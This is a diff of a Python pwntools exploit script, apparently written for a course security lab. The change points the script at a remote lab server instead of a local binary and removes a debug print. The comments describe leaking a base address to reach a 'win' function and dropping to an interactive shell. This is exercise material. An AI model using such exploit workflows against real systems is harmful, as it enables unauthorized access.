@@ -7,9 +7,9 @@ if __name__ == "__main__":
     # The goal is to use this base address to calculate the "win" address quickly.
     
     # I start by running the process.
-    # process_to_exploit = pwn.remote("csc748.hostbin.org", 7013)
+    process_to_exploit = pwn.remote("csc748.hostbin.org", 7013)
     # This next line can replace the one above for testing against a local binary.
-    process_to_exploit = pwn.process("./lab1-3.bin")
+    # process_to_exploit = pwn.process("./lab1-3.bin")
 
     # I read a line from STDOUT until the hexadecimal prefix is reached.
     # This information is not useful, so it is dropped.
@@ -35,5 +35,3 @@ if __name__ == "__main__":
 
     # I drop to a shell.
     process_to_exploit.interactive()
-
-    print("I am a breakpoint placeholder to help with debugging")
